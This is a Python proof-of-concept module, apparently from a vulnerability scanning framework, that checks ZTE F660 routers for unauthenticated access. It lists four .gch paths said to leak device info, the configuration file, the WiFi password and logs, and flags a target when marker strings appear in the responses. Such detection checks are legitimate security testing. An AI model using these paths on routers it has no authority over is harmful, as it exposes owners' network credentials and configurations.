# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ZTE_0011'  # 平台漏洞编号，留空
    name = 'ZTE-F660 未授权访问'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-07-01'  # 漏洞公布时间
    desc = '''
        status_dev_info_t.gch            不登录情况下直接获取路由信息
        manager_dev_config_t.gch         不登录情况下直接获取路由配置文件
        wlan_security.gch                不登录情况下直接获取路由ESSID以及WIFI密码
        manager_log_conf_t.gch           不登录情况下直接获取路由日志
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ZTE'  # 漏洞应用名称
    product_version = 'ZTE-F660'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b5890666-2d38-402a-89e6-07d0be178a19'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Referer   :  http://www.wooyun.org/bugs/wooyun-2010-066850
            hh = hackhttp.hackhttp()
            payloads = [
                ['/status_dev_info_t.gch', 'Frm_CarrierName'],
                ['/manager_dev_config_t.gch', 'ConfigUpload'],
                ['/wlan_security.gch', 'PreSharedKey'],
                ['/manager_log_conf_t.gch', 'Transfer_meaning']
            ]
            for p in payloads:
                url = self.target + p[0]
                code, head, res, errcode, _ = hh.http(url)

                if p[1] in res:
                    # security_hole(url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
